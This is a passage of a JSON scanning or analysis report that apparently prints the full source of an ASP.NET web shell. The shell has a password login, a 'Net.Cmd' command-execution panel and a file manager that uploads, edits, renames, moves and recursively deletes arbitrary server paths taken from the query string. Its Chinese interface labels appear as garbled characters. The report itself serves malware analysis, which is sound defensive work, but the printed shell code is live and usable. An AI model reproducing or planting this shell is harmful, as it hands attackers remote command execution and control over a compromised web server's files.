            "\ttemp=request.QueryString(\"src\")",
            "\tcall delfile(temp)  ",
            "\tlblerror.text=\"\u027e\u013c \" & temp & \" \u0279\"",
            "end sub",
            "sub delfile(temp)",
            "\tDim ex as Exception",
            "\ttry",
            "\t\tif right(temp,1)=\"\\\" then",
            "\t\t\tdim xdir as directoryinfo",
            "\t\t\tdim mydir as new DirectoryInfo(temp)",
            "\t\t\tdim xfile as fileinfo",
            "\t\t\tfor each xfile in mydir.getfiles()",
            "\t\t\t\tfile.delete(temp & xfile.name)",
            "\t\t\tnext",
            "\t\t\tfor each xdir in mydir.getdirectories()",
            "\t\t\t\tcall delfile(temp & xdir.name & \"\\\")",
            "\t\t\tnext",
            "\t\t\tdirectory.delete(temp)",
            "\t\telse",
            "\t\t\tfile.delete(temp)",
            "\t\tend if",
            "\tCatch ex",
            "\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ucce3</font>\" & ex.Message)",
            "\tEnd Try",
            "End Sub",
            "Sub movefile ( Sender as Object, e as EventArgs ) ",
            "\tDim ex as Exception",
            "\ttry",
            "\t\tlblpath.text= srcfile.text & \"->\" & desfile.text & \"\u013c\u01b6\u047e\u0279\u0263\"",
            "\t\tFile.move( srcfile.text , desfile.text ) ",
            "\tCatch ex",
            "\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ucce3</font>\" & ex.Message)",
            "\tEnd Try",
            "End sub ",
            "Sub copyfile ( Sender as Object, e as EventArgs ) ",
            "\tDim ex as Exception",
            "\ttry",
            "\t\tFile.copy( srcfile.text , desfile.text ) ",
            "\tCatch ex",
            "\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ucce3</font>\" & ex.Message)",
            "\tEnd Try",
            "End sub   ",
            "sub rename()",
            "\turl=request.QueryString(\"src\")",
            "\tpanel05.visible=\"true\"",
            "end sub",
            "sub rename_clicked( Sender as Object, e as EventArgs ) ",
            "\tDim ex as Exception",
            "\ttry",
            "\t\tmydir=new directoryinfo(url)",
            "\t\tfile.copy(url,mydir.parent.fullname & newfilename.text)",
            "\t\tcall delfile(url)  ",
            "\t\tlblpath.text=\" \" & replace(url,\"\\\",\"\\\\\") & \" \u0279\"",
            "\tCatch ex",
            "\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ucce3</font>\" & ex.Message)",
            "\tEnd Try",
            "end sub",
            "</script>",
            "<html><head>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html\" charset=gb2312>",
            "<title>12345</title>",
            "<style type=\"text/css\">",
            "\tfont-family: verdana, arial, Geneva, Helvetica, sans-serif;",
            "\tcolor: #FAFC72;",
            "\ttext-decoration: none;",
            "A:hover",
            "\ttext-decoration: underline;",
            "\tfont-family: verdana, arial, Geneva, Helvetica, sans-serif;",
            "\tfont-size: 9pt;",
            "\tcolor: #FFFFFF;",
            ".btn",
            "\tcolor: #FAFC72;",
            "\tbackground-color: #000000;",
            "html, body",
            "\tmargin:0;",
            "\tpadding:0;",
            "\tcolor: #FAFC72;",
            "\tbackground-color: #000000;",
            "</style>",
            "<script language=\"javascript\">",
            "function del()",
            "if(confirm(\"\u0237\u027e\")){return true;}",
            "else{return false;}",
            "</script>",
            "</head><body>",
            "<div style=\"padding:15,15,15,15;font-size:10pt;font-family:verdana\"; ",
            "border-width:2px 2px 2px 2px; border-style:solid; border-color:black;\">",
            "<center>[<a href=\"?act=info\">\u03f5\u0373</a>] | [<a href=\"?act=cmdshell\">Net.Cmd</a>]| [<a href=\"?act=filemanage\">\u013c</a>] | [<a href=\"javascript:history.back(1);\"></a>] | [<a href=\"?act=loginout\">\u02f3</a>]</center>",
            "<hr width=\"90%\">",
            "<form method = \"post\" enctype = \"multipart/form-data\" runat = \"server\">",
            "<table width=\"80%\"  border=\"0\" align=\"center\">",
            "<asp:label id=\"lblinfo\"  runat=\"server\"  maintainstate=\"false\"/><p>",
            "<asp:label id=\"lblerror\"  runat=\"server\"  maintainstate=\"false\"/><p>",
            "</table>",
            "<asp:panel id=\"Panel0\" runat=\"server\"  visible=\"false\">",
            "<table width=\"80%\"  border=\"0\" align=\"center\">",
            "<asp:textbox id=\"tbcmd\"  width=\"30%\" runat=\"server\"/>",
            "<asp:button id=\"btcmd\" text=\"runcmd\" class=\"btn\" onclick=\"runcmd\" runat=\"server\"/></center><br>",
            "<asp:label id=\"lblcmd\" runat=\"server\"/>",
            "</table>",
            "</asp:panel>",
            "<asp:panel id=\"panel01\" runat=\"server\"  visible=\"false\">",
            "<center><asp:textbox id=\"tbpmd\" textmode=\"password\" runat=\"server\"/>",
            "<asp:button id=\"btlogin\" text=\"Login\" class=\"btn\" onclick=\"runlogin\" runat=\"server\"/></center>",
            "</asp:panel>",
            "<asp:panel id=\"panel02\" runat=\"server\"  visible=\"false\">",
            "<table width=\"80%\"  border=\"0\" align=\"center\">",
            "<asp:label id=\"lblpath\" runat=\"server\"/>",
            "\t<tr>\u013c\u03f4<br>\t",
            "\u0461\u013c<input id = \"loFile\" type = \"file\" runat = \"server\" > <br >",
            "<input id = \"dir\" type = \"text\" runat = \"server\" >",
            "<input type = \"submit\" class=\"btn\" value = \"\u03f4\u013c\" OnServerClick = \"UploadFile_Clicked\" runat = \"server\" >",
            "<br >",
            "\t</tr>",
            "\t<hr>",
            "\t<tr>\u013c\u01b6/<br>",
            "\u0534\u05b7 <asp:textbox id=\"srcfile\"  width=\"90%\" runat=\"server\" /><br >",
            "\u013f\u0135\u05b7<asp:textbox id=\"desfile\"  width=\"90%\" runat=\"server\" /><br>",
            "  <asp:button id=\"btmove\" text=\"\u01b6\" class=\"btn\"OnServerClick = \"moveFile\" runat = \"server\"/>",
            "<asp:button id=\"btcopy\" text=\"\" class=\"btn\"OnServerClick = \"copyFile\" runat = \"server\"/>",
            "<br >",
            "\t</tr>",
            "\t<hr>",
            "\t<tr>",
            "\t\t<td width=\"15%\"><strong></strong></td>",
            "\t\t<td width=\"10%\"><strong>\u0421(byte)</strong></td>",
            "\t\t<td width=\"10%\"><strong>\u02b1</strong></td>",
            "\t\t<td width=\"10%\"><strong>\u07b8\u02b1</strong></td>",
            "\t\t<td width=\"10%\"><strong>\u02b1</strong></td>",
            "\t\t<td width=\"25%\"><strong></strong></td>",
            "\t</tr>",
            "    <tr>",
            "       <td>",
            "\t\t<%",
            "\t\tmydir=new directoryinfo(url)",
            "\t\tdim panel02info as string= \"<tr><td><a href='?act=filemanage&src=\" & server.urlencode(mydir.parent.fullname) &  \"\\'>\u013f",
            "..</a></td></tr>\"",
            "\t\tresponse.Write(panel02info)",
            "\t\tfor each xdir in mydir.getdirectories",
            "\t\t\tresponse.Write(\"<tr>\")",
            "\t\t\tdim filepath as string ",
            "\t\t\tfilepath=server.UrlEncode(url & xdir.name)",
            "\t\t\tpanel02info= \"<td><a href='?act=filemanage&src=\" & filepath & \"\\\" & \"'>\" & xdir.name & \"</a></td>\"",
            "\t\t\tresponse.Write(panel02info)",
            "\t\t\tresponse.Write(\"<td>&lt;dir&gt;</td>\")",
            "\t\t\tresponse.Write(\"<td>\" & Directory.GetCreationTime(url & xdir.name) & \"</td>\")",
            "   \t\t\tresponse.Write(\"<td>\" & Directory.GetLastWriteTime(url & xdir.name) & \"</td>\")",
            "\t\t\tresponse.Write(\"<td>\" & Directory.GetlastAccessTime(url & xdir.name) & \"</td>\")",
            "\t\t\tpanel02info=\"<td><a href='?act=del&src=\" & filepath & \"\\'\" & \" onclick='return del(this);'>\u027e</a></td>\"",
            "\t\t\tresponse.Write(panel02info)",
            "\t\t\tresponse.Write(\"</tr>\")",
            "\t\tnext",
            "\t\t%>",
            "\t\t</td>",
            "\t</tr>",
            "\t<tr>",
            "        <td>",
            "\t\t<%",
            "\t\tfor each xfile in mydir.getfiles()",
            "\t\t\tdim filepath2 as string",
            "\t\t\tfilepath2=server.UrlEncode(url & xfile.name)",
            "\t\t\tresponse.Write(\"<tr>\")",
            "\t\t\tpanel02info=\"<td>\" & xfile.name & \"</td>\"",
            "\t\t\tresponse.Write(panel02info)",
            "\t\t\tpanel02info=\"<td>\" & xfile.length & \"</td>\"",
            "\t\t\tresponse.Write(panel02info)",
            "\t\t\tresponse.Write(\"<td>\" & File.GetCreationTime(url & xfile.name) & \"</td>\")",
            "\t\t\tresponse.Write(\"<td>\" & File.GetLastWriteTime(url & xfile.name) & \"</td>\")",
            "\t\t\tresponse.Write(\"<td>\" & File.GetlastAccessTime(url & xfile.name) & \"</td>\")\t",
            "\t\t\tpanel02info=\"<td><a href='?act=edit&src=\" & filepath2 & \"' target='_blank'>\u0f2d</a>|<a href='?act=rename&src=\" & filepath2 & \"' target='_blank'></a>|<a href='?act=del&src=\" & filepath2 & \"' onClick='return del(this);'>\u027e</a></td>\"",
            "\t\t\tresponse.Write(panel02info)",
            "\t\t\tresponse.Write(\"</tr>\")",
            "\t\tnext",
            "\t\tresponse.Write(\"</table>\")",
            "\t\t%>",
            "\t\t</td>",
            "    </tr>",
            "</table>",
            "</asp:panel>",
            "<asp:panel id=\"panel03\" runat=\"server\"  visible=\"false\">",
            "<table width=\"80%\"  border=\"0\" align=\"center\">",
            "<asp:textbox id=\"tbfile\"  width=\"90%\" runat=\"server\" /><p>",
            "\u0763<asp:textbox id=\"tbcontents\" runat=\"server\" textmode=\"multiline\" columns=\"80\" rows=\"20\" />",
            "<asp:button id=\"btwrite\" class=\"btn\" runat=\"server\" onclick=\"writefile\" text=\"\u07b8\"/>",
            "</table>",
            "</asp:panel>",
            "<ASP:panel id = \"panel04\" visible = \" false \" runat = \"server\">",
            "<table width=\"80%\"  border=\"0\" align=\"center\">",
            "\u0279\u03f4 <ASP:label id = \"FileName\" runat = \"server\" /> <br>",
            "\u013c\u0421 <ASP:label id = \"FileLength\" runat = \"server\" /> bytes <br>",
            "\u013c <ASP:label id = \"FileType\" runat = \"server\" /> <br>",
            "</table>",
            "</ASP:panel>",
            "<ASP:panel id = \"panel05\" visible = \" false \" runat = \"server\">",
            "<table width=\"80%\"  border=\"0\" align=\"center\">",
            "\u013c: <ASP:textbox id = \"newFileName\" runat = \"server\" /> <br>",
            "<asp:button id=\"btrename\" class=\"btn\" runat=\"server\" onclick=\"rename_clicked\" text=\"\u07b8\"/>",
            "</table>",
            "</ASP:panel>",
            "</form>  ",
            "<hr width=\"90%\">",
            "</div>",
            "</body></html>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.364395",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
